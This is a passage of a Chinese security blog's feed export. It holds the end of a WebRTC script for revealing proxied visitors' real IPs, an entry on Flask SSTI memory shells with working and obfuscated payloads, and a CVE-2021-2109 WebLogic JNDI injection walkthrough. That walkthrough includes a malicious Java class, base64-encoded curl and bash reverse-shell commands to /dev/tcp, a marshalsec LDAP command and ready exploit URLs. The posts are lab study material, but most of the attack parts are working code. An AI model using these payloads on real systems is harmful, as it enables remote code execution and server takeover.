window.webkitRTCPeerConnection;</span><br><span class="line">                <span class="keyword">var</span> useWebKit = !!window.webkitRTCPeerConnection;</span><br><span class="line">                <span class="comment">//bypass naive webrtc blocking using an iframe</span></span><br><span class="line">                <span class="keyword">if</span>(!RTCPeerConnection)&#123;</span><br><span class="line">                    <span class="keyword">var</span> win = document.getElementById(<span class="string">"rtc_iframe"</span>).contentWindow;</span><br><span class="line">                    RTCPeerConnection = win.RTCPeerConnection</span><br><span class="line">                        || win.mozRTCPeerConnection</span><br><span class="line">                        || win.msRTCPeerConnection</span><br><span class="line">                        || win.webkitRTCPeerConnection;</span><br><span class="line">                    useWebKit = !!win.webkitRTCPeerConnection;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//minimal requirements for data connection</span></span><br><span class="line">                <span class="keyword">var</span> mediaConstraints = &#123;</span><br><span class="line">                    optional: [&#123;RtpDataChannels: <span class="keyword">true</span>&#125;]</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> servers = &#123;</span><br><span class="line">                  iceServers: [</span><br><span class="line">                    &#123;</span><br><span class="line">                      urls: [</span><br><span class="line">                        <span class="string">'stun:stun.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun1.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun2.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun3.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun4.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">"stun:stun.ekiga.net?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.ideasip.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.rixtelecom.se?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.schlund.de?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.stunprotocol.org:3478?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voiparound.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voipbuster.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voipstunt.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voxgratia.org?transport=udp"</span></span><br><span class="line">                      ]</span><br><span class="line">                    &#125;</span><br><span class="line">                  ]</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">//construct a new RTCPeerConnection</span></span><br><span class="line">                <span class="keyword">var</span> pc;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                  pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                  <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">handleCandidate</span><span class="params">(candidate)</span></span>&#123;</span><br><span class="line">                  <span class="comment">//match just the IP address</span></span><br><span class="line">                  <span class="keyword">var</span> ip_regex = /([<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;(\.[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)&#123;<span class="number">3</span>&#125;|[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;(:[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">7</span>&#125;)/</span><br><span class="line">                  <span class="keyword">var</span> ip_addr = ip_regex.exec(candidate)[<span class="number">1</span>];</span><br><span class="line">                  <span class="comment">//remove duplicates</span></span><br><span class="line">                  <span class="keyword">if</span>(ip_dups[ip_addr] === undefined)</span><br><span class="line">                      callback(ip_addr);</span><br><span class="line">                  ip_dups[ip_addr] = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//listen for candidate events</span></span><br><span class="line">                pc.onicecandidate = <span class="function"><span class="keyword">function</span><span class="params">(ice)</span></span>&#123;</span><br><span class="line">                  <span class="comment">//skip non-candidate events</span></span><br><span class="line">                  <span class="keyword">if</span>(ice.candidate)</span><br><span class="line">                    handleCandidate(ice.candidate.candidate);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//create a bogus data channel</span></span><br><span class="line">                pc.createDataChannel(<span class="string">"bl"</span>);</span><br><span class="line">                <span class="comment">//create an offer sdp</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                  pc.createOffer().then(<span class="function"><span class="keyword">function</span><span class="params">(result)</span> </span>&#123;</span><br><span class="line">                    pc.setLocalDescription(result);</span><br><span class="line">                  &#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                  pc.createOffer().then(<span class="function"><span class="keyword">function</span><span class="params">(result)</span> </span>&#123;</span><br><span class="line">                    pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;);</span><br><span class="line">                  &#125;, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//wait for a while to let everything done</span></span><br><span class="line">                setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">                    <span class="comment">//read candidate info from local description</span></span><br><span class="line">                    <span class="keyword">var</span> lines = pc.localDescription.sdp.split(<span class="string">'\n'</span>);</span><br><span class="line"></span><br><span class="line">                    lines.<span class="keyword">forEach</span>(<span class="function"><span class="keyword">function</span><span class="params">(line)</span></span>&#123;</span><br><span class="line">                      <span class="keyword">if</span>(line.indexOf(<span class="string">'a=candidate:'</span>) === <span class="number">0</span>)</span><br><span class="line">                        handleCandidate(line);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;, <span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//insert IP addresses into the page</span></span><br><span class="line">            getIPs(<span class="function"><span class="keyword">function</span><span class="params">(ip)</span></span>&#123;</span><br><span class="line">                <span class="keyword">var</span> li = document.createElement(<span class="string">"li"</span>);</span><br><span class="line">                li.textContent = ip;</span><br><span class="line">                <span class="comment">//local IPs</span></span><br><span class="line">                <span class="keyword">if</span> (ip.match(/^(<span class="number">192</span>\<span class="number">.168</span>\.|<span class="number">169</span>\<span class="number">.254</span>\.|<span class="number">10</span>\.|<span class="number">172</span>\.(<span class="number">1</span>[<span class="number">6</span><span class="number">-9</span>]|<span class="number">2</span>\d|<span class="number">3</span>[<span class="number">01</span>]))/))</span><br><span class="line">                  document.getElementById(<span class="string">"localip"</span>).appendChild(li);</span><br><span class="line">                <span class="comment">//IPv6 addresses</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ip.match(/^[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;(:[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">7</span>&#125;$/))</span><br><span class="line">                  document.getElementById(<span class="string">"ipv6"</span>).appendChild(li);</span><br><span class="line">                <span class="comment">//assume the rest are public IPs</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                  document.getElementById(<span class="string">"publicip"</span>).appendChild(li);</span><br><span class="line">            &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>使用Socks5代理访问，成功获取到真实出口IP：</p><p><img src="/2021/04/20/通过WebRTC获取代理池中攻击者真实IP/1.png" alt=""></p><h3 id="云函数代理池测试"><a href="#云函数代理池测试" class="headerlink" title="云函数代理池测试"></a>云函数代理池测试</h3><p>待测试分析…</p><h3 id="红蓝对抗借鉴"><a href="#红蓝对抗借鉴" class="headerlink" title="红蓝对抗借鉴"></a>红蓝对抗借鉴</h3><h4 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h4><ul><li>专用打点浏览器，禁掉WebRTC功能：<ul><li>Chrome：在Chrome应用商店里，安装一个名为WebRTC Leak Prevent的扩展，然后选择Disable non-proxied UDP(force proxy)即可。</li><li>Firefox：在浏览器上输入<code>about:config</code>，之后搜索<code>media.peerconnection.enabled</code>，找到它后双击，将其改成false即可。</li></ul></li><li>改用VPN；</li><li>禁掉了WebRTC后，推荐用热点，再挂代理池；</li></ul><h4 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h4><ul><li>外网打点页面嵌入，如WAF拦截页面；</li><li>蜜罐页面嵌入；</li><li>不仅局限于WebRTC，研究其他基于UDP协议的功能；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="红队" scheme="https://www.mi1k7ea.com/categories/%E7%BA%A2%E9%98%9F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="红队" scheme="https://www.mi1k7ea.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>浅析Python Flask内存马</title>
    <link href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://www.mi1k7ea.com/2021/04/07/浅析Python-Flask内存马/</id>
    <published>2021-04-07T11:32:22.000Z</published>
    <updated>2021-04-27T07:59:41.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看到一个Python Flask内存马，学习一下：<a href="https://github.com/iceyhexman/flask_memory_shell" target="_blank" rel="noopener">https://github.com/iceyhexman/flask_memory_shell</a></p><h2 id="0x01-Python-Flask内存马"><a href="#0x01-Python-Flask内存马" class="headerlink" title="0x01 Python Flask内存马"></a>0x01 Python Flask内存马</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>简单写个Flask SSTI漏洞环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    person = <span class="string">'guest'</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>原始Flask内存马payload，其中的默认命令也可以去掉：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span>,&#123;<span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],<span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]&#125;)</span><br></pre></td></tr></table></figure><p>访问如下URL生成Flask内存马：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>最后访问/shell内存马接口即可执行任意命令：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/1.png" alt=""></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们将payload拆开来逐层分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](</span><br><span class="line"><span class="string">"app.add_url_rule(</span></span><br><span class="line"><span class="string">'/shell', </span></span><br><span class="line"><span class="string">'shell', </span></span><br><span class="line"><span class="string">lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">"</span>,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],</span><br><span class="line"><span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="url-for-globals-39-builtins-39-39-eval-39"><a href="#url-for-globals-39-builtins-39-39-eval-39" class="headerlink" title="url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]"></a><code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code></h4><p>这个是Flask SSTI中的payload。</p><p>url_for()是Flask的一个内置函数：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/3.png" alt=""></p><p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/4.png" alt=""></p><p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/5.png" alt=""></p><p>直接调用就能执行命令了：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/6.png" alt=""></p><h4 id="app-add-url-rule-函数"><a href="#app-add-url-rule-函数" class="headerlink" title="app.add_url_rule()函数"></a>app.add_url_rule()函数</h4><p>在Flask中注册路由的时候是添加的<a href="mailto:`@app.route" target="_blank" rel="noopener">`@app.route</a>()`装饰器来实现的。</p><p>点进去看到其源码实现，其调用了add_url_rule()函数来添加路由：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/2.png" alt=""></p><p>add_url_rule()函数定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint=<span class="keyword">None</span>, view_func=<span class="keyword">None</span>, provide_automatic_options=<span class="keyword">None</span>, **options)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以<code>/</code>开头；</li><li>endpoint：端点，即在使用url_for()进行反转的时候，这里传入的第一个参数就是endpoint对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为endpoint的值；</li><li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）；</li><li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；</li><li>options：要转发到基础规则对象的选项。Werkzeug的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听GET（并隐式地侦听HEAD）。从Flask0.6开始，通过标准请求处理隐式添加和处理选项；</li></ul><p>由此可见，payload这部分是动态添加了一条路由，而处理该路由的函数是个由lambda关键字定义的匿名函数。</p><h4 id="lambda与-request-ctx-stack"><a href="#lambda与-request-ctx-stack" class="headerlink" title="lambda与_request_ctx_stack"></a>lambda与_request_ctx_stack</h4><p>lambda即匿名函数，payload中add_url_rule()函数的第三个参数定义了一个lambda匿名函数，其中通过os库的popen()函数执行从Web请求中获取的cmd参数值并返回结果，其中该参数值默认为whoami。</p><p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例。</p><p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p><h3 id="绕过变形"><a href="#绕过变形" class="headerlink" title="绕过变形"></a>绕过变形</h3><p>以Python沙箱逃逸的技巧为例：</p><ul><li><code>url_for</code>可用<code>get_flashed_messages</code>或<code>request.application.__self__._get_data_for_json</code>等替换；</li><li>代码执行函数替换，如exec等替换eval；</li><li>字符串可采用拼接方式，如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</li><li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换；</li><li><code>[]</code>中括号可用<code>.__getitem__()</code>或<code>.pop()</code>替换；</li><li>…</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.application.__self__._get_data_for_json.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).__getitem__(<span class="string">'__bui'</span>+<span class="string">'ltins__'</span>).__getitem__(<span class="string">'ex'</span>+<span class="string">'ec'</span>)(<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'calc')).read())"</span>,&#123;<span class="string">'_request_ct'</span>+<span class="string">'x_stack'</span>:get_flashed_messages.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).pop(<span class="string">'_request_'</span>+<span class="string">'ctx_stack'</span>),<span class="string">'app'</span>:get_flashed_messages.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).pop(<span class="string">'curre'</span>+<span class="string">'nt_app'</span>)&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
      <category term="SSTI" scheme="https://www.mi1k7ea.com/tags/SSTI/"/>
    
      <category term="内存马" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic JNDI注入RCE（CVE-2021-2109）</title>
    <link href="https://www.mi1k7ea.com/2021/04/06/%E6%B5%85%E6%9E%90WebLogic-JNDI%E6%B3%A8%E5%85%A5RCE%EF%BC%88CVE-2021-2109%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/</id>
    <published>2021-04-06T07:52:57.000Z</published>
    <updated>2021-04-06T13:02:07.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic JNDI注入RCE（CVE-2021-2109）。</p><h2 id="0x01-WebLogic-JNDI注入RCE（CVE-2021-2109）"><a href="#0x01-WebLogic-JNDI注入RCE（CVE-2021-2109）" class="headerlink" title="0x01 WebLogic JNDI注入RCE（CVE-2021-2109）"></a>0x01 WebLogic JNDI注入RCE（CVE-2021-2109）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>拥有访问<code>/console/consolejndi.portal</code>页面的用户权限，或者存在CVE-2020-14883未授权访问漏洞。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic的/console/consolejndi.portal接口可以调用存在JNDI注入漏洞的com.bea.console.handles.JndiBindingHandle类，从而造成RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境搭建好之后，利用前面CVE-2020-14883的未授权访问漏洞可以直接访问到consolejndi.portal页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/css/%252e%252e%252fconsolejndi.portal</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/1.png" alt=""></p><p>先来编写一个恶意类Exp，其中payload为打DNSLog外带验证：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//Process p = Runtime.getRuntime().exec(newString[]&#123;"cmd","/c","calc.exe"&#125;);</span></span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"echo 'Y3VybCBodHRwOi8vd2VibG9naWMudnZkN3FzLmRuc2xvZy5jbi8=' | base64 -d | bash"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启Web服务，其中存放上述恶意类以供JNDI注入远程加载访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 88</span><br></pre></td></tr></table></figure><p>开启恶意LDAP服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.19.0.1:88/<span class="comment">#Exp 9998</span></span><br></pre></td></tr></table></figure><p>原始Exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://172.19.0;1:9998/aew0xy;AdminServer%22)</span><br></pre></td></tr></table></figure><p>结合未授权访问漏洞的Exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://172.19.0;1:9998/aew0xy;AdminServer%22)</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/2.png" alt=""></p><p>在LDAP服务端和Web服务端都有记录：</p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/3.png" alt=""></p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/4.png" alt=""></p><p>DNSLog外带成功：</p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/5.png" alt=""></p><p>证明存在漏洞且能外连，要反弹shell的话直接修改Exp类执行的命令在base64编码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bash -i &gt;&amp; /dev/tcp/172.19.0.1/6666 0&gt;&amp;1</span></span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzY2NjYgMD4mMQ==' | base64 -d | bash"</span>&#125;);</span><br></pre></td></tr></table></figure><p>更新Web服务上的Exp类后，再发一次报文就能成功获取到shell了：</p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/6.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw</a></p><p><a href="https://y4er.com/post/weblogic-cve-2021-2109-jndi-rce/" target="_blank" rel="noopener">https://y4er.com/post/weblogic-cve-2021-2109-jndi-rce/</a></p><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级WebLogic版本。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic SSRF（CVE-2014-4210）</title>
    <link href="https://www.mi1k7ea.com/2021/04/06/%E6%B5%85%E6%9E%90WebLogic-SSRF%EF%BC%88CVE-2014-4210%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/</id>
    <published>2021-04-05T16:14:07.000Z</published>
    <updated>2021-04-06T07:53:05.643Z</updated>
    
